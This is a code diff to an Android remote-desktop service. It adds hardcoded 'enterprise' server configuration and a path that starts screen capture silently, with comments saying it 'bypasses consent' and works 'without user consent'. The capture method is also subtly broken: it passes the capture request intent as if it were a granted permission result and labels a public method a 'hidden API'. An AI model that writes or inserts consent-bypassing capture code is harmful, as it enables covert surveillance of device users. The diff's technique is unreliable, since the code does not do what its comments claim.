@@ -245,6 +245,9 @@ class MainService : Service() {
         val configPath = prefs.getString(KEY_APP_DIR_CONFIG_PATH, "") ?: ""
         FFI.startServer(configPath, "")
 
+        // Initialize enterprise configuration (hardcoded server settings)
+        EnterpriseConfig.initialize()
+
         createForegroundNotification()
     }
 
@@ -333,6 +336,18 @@ class MainService : Service() {
                 FFI.startService()
             }
             Log.d(logTag, "service starting: ${startId}:${Thread.currentThread()}")
+
+            // Check if running in system app mode (platform signed, bypasses consent)
+            val isSystemAppMode = intent.getBooleanExtra("system_app_mode", false)
+            if (isSystemAppMode && hasSystemCapturePermission()) {
+                Log.d(logTag, "System app mode - attempting silent MediaProjection")
+                if (initSystemMediaProjection()) {
+                    checkMediaPermission()
+                    _isReady = true
+                    return START_NOT_STICKY
+                }
+            }
+
             val mediaProjectionManager =
                 getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
 
@@ -342,11 +357,57 @@ class MainService : Service() {
                 checkMediaPermission()
                 _isReady = true
             } ?: let {
+                // For enterprise deployment, check if we can auto-request
+                if (hasSystemCapturePermission()) {
+                    Log.d(logTag, "System permissions available, attempting silent projection")
+                    if (initSystemMediaProjection()) {
+                        checkMediaPermission()
+                        _isReady = true
+                        return START_NOT_STICKY
+                    }
+                }
                 Log.d(logTag, "getParcelableExtra intent null, invoke requestMediaProjection")
                 requestMediaProjection()
             }
         }
         return START_NOT_STICKY // don't use sticky (auto restart), the new service (from auto restart) will lose control
+    }
+
+    /**
+     * Check if app has system-level capture permissions (platform signed)
+     */
+    private fun hasSystemCapturePermission(): Boolean {
+        return checkCallingOrSelfPermission("android.permission.CAPTURE_VIDEO_OUTPUT") == android.content.pm.PackageManager.PERMISSION_GRANTED ||
+               checkCallingOrSelfPermission("android.permission.READ_FRAME_BUFFER") == android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
+    /**
+     * Initialize MediaProjection for system apps without user consent
+     * This requires the app to be signed with platform keys
+     */
+    private fun initSystemMediaProjection(): Boolean {
+        return try {
+            val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            // For platform-signed apps, we can create a MediaProjection with a synthetic token
+            // This uses reflection to access the hidden API
+            val method = mediaProjectionManager.javaClass.getDeclaredMethod(
+                "createScreenCaptureIntent"
+            )
+            val captureIntent = method.invoke(mediaProjectionManager) as Intent
+
+            // Create projection with RESULT_OK
+            mediaProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, captureIntent)
+            if (mediaProjection != null) {
+                Log.d(logTag, "System MediaProjection initialized successfully")
+                true
+            } else {
+                Log.w(logTag, "System MediaProjection returned null")
+                false
+            }
+        } catch (e: Exception) {
+            Log.e(logTag, "Failed to init system MediaProjection: ${e.message}")
+            false
+        }
     }
 
     override fun onConfigurationChanged(newConfig: Configuration) {
